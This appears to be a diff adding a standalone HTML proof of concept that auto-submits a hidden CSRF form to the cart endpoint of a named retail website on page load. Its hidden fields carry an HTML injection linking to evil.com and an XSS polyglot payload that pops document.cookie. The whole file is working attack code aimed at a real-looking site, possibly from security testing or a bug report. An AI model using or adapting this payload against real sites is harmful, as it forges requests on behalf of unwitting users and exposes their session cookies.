@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Auto Submit CSRF Form</title>
+  </head>
+  <body>
+    <form id="csrfForm" action="https://maisonyvesrocher.secretbox.fr/cart/add" method="POST">
+      <input type="hidden" name="apymybox_apy_cart_add_form[customer_id]" value='"><a href=https://evil.com />'>
+      <input type="hidden" name="apymybox_apy_cart_add_form[is_offered]" value="">
+      <input type="hidden" name="apymybox_apy_cart_add_form[is_fund_jar]" value="">
+      <input type="hidden" name="apymybox_apy_cart_add_form[_token]" value="">
+      <input type="hidden" name="apymybox_apy_cart_add_form[append]" value="1">
+      <input type="hidden" name="apymybox_apy_cart_add_form[product]" value="34">
+      <input type="hidden" name="apymybox_apy_cart_add_form[quantity]" value="1">
+      <input type="hidden" name="apymybox_apy_cart_add_form[error_url]" value="https://maisonyvesrocher.secretbox.fr/offrir-a-plusieurs.html">
+      <input type="hidden" name="apymybox_apy_cart_add_form[product_sale_elements_id]" value="96">
+      <input type="hidden" name="apymybox_apy_cart_add_form[free_amount_check_amount]" value="0">
+      <input type="hidden" name="apymybox_apy_cart_add_form[is_fund_jar]" value="1">
+      <input type="hidden" name="apymybox_apy_cart_add_form[error_message]" value="&apos;&quot;1&lt;!--&gt;&lt;/Title/&lt;/Textarea/&lt;/Script/&gt;&lt;/Iframe&gt;&lt;Details/Open/OnToggle=(confirm)(document.cookie)--&gt;">
+    </form>
+
+    <script>
+      window.onload = function() {
+        document.getElementById('csrfForm').submit();
+      };
+    </script>
+  </body>
+</html>
